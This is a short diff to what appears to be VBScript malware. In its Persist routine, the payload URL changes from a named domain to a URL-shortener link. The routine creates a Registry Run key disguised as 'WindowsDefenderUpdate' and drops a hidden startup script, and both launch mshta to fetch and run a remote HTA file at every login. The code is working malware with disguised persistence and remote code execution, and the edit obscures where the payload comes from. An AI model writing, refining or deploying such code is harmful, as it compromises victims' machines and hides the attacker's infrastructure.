@@ -24,7 +24,7 @@ Sub RegrabAll()
 End Sub
 
 Sub Persist()
-    Dim payload: payload = "mshta https://dicerigs.app/check.hta"
+    Dim payload: payload = "mshta https://tinyurl.com/436kk33s"
 
     ' Registry Run — fires on every login
     sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdate", payload, "REG_SZ"
@@ -35,7 +35,7 @@ Sub Persist()
     ' Startup folder VBS — fires on every login
     Dim sp: sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\wdu.vbs"
     Dim sf: Set sf = fso.CreateTextFile(sp, True)
-    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://dicerigs.app/check.hta"", 0, False"
+    sf.WriteLine "CreateObject(""WScript.Shell"").Run ""mshta https://tinyurl.com/436kk33s"", 0, False"
     sf.Close
     Set sf = Nothing
 End Sub
